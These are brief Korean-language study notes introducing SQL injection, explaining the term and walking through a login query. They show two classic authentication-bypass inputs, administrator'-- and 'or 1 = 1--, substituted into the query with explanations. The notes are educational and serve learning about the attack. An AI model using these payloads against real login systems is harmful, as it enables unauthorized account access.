SQL Insection
인젝션 - 주입하다

SQL - 질의어
DB가 어떻게 웹에서 작동하는지 또는 이용되는지

SELECT * FROM user WHERE ID = 'asdf' and password = 'asdf'

administrator'--

SELECT * FROM user WHERE ID = 'administrator'--' and password = 'asdf'
>>온전한 코드를 위해 싱글쿼터 그리고 주석 뒤를 날림

and or
그리고 또는


'or 1 = 1--

SELECT * FROM user WHERE ID = '' or 1 = 1--' and password = 'asdf'
>>ID의 값은 없지만 or 뒤의 문이 참이므로 참